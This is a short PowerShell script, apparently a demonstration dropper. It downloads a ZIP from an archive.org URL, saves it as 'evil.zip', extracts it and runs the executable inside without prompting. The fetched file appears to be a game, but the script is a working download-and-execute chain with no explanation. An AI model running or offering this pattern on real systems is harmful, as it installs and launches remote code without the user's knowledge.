$url = "https://ia800208.us.archive.org/29/items/Open_Sonic/OpenSonicWin.zip"
$destination = "$env:USERPROFILE\Documents\evil.zip"
Invoke-WebRequest -Uri $url -OutFile $destination



#Extract the ZIP file:
$zipPath = "$env:USERPROFILE\Documents\evil.zip"
$extractPath = "$env:USERPROFILE\Documents\evil"
Expand-Archive -Path $zipPath -DestinationPath $extractPath -F

#Run the EXE file:
$exePath = "$env:USERPROFILE\Documents\evil\opensonic.exe"
Start-Process -FilePath $exePath

